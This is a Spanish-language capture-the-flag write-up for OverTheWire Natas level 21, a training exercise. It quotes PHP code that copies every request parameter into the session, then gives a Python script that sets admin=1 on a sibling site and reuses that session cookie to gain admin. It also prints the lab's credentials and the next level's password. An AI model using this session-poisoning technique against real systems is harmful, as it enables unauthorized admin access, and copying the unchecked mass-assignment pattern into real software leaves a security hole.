# Natas 21

#### URL: http://natas21.natas.labs.overthewire.org/
#### Credenciales: natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH

En http://natas21-experimenter.natas.labs.overthewire.org cualquier parametro que pasemos en la actualizacion de la pagina se agrega como clave de $_SESSION y se le asigna el valor correspondiente:
``` php
// http://natas21-experimenter.natas.labs.overthewire.org/
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
```

En http://natas21.natas.labs.overthewire.org/ si $_SESSION tiene la propiedad "admin" con valor 1 entonces tiene permisos administrativos:
``` php
<?php

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
```

Como ambos sitios son administrados por el mismo servidor asumimos que el formato de la cookie de sesion es el mismo. Entonces creamos una cookie de sesion con la propiedad admin=1 en http://natas21-experimenter.natas.labs.overthewire.org y la usamos para acceder a http://natas21.natas.labs.overthewire.org:

``` python3
import requests

URL="http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug"
h1 = {"Authorization": "Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==, Cookie: PHPSESSID=hjj8rv5k0ncad82hhg4h9lli6o",
           "Content-Type": "application/x-www-form-urlencoded"
          }
data = "align=left&fontsize=30%25&bgcolor=green&submit=Update&admin=1"
x = requests.post(URL,headers=h1,data=data)
dangerousCookie = x.cookies.get("PHPSESSID")
print(dangerousCookie)

h2 = {"Authorization": "Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==", "Cookie": f"PHPSESSID={dangerousCookie}", }
x = requests.get("http://natas21.natas.labs.overthewire.org",headers=h2)
print(x.text)
```

Ejecutamos este script con `python script.py` y obtenemos Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz

`natas22:Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz`

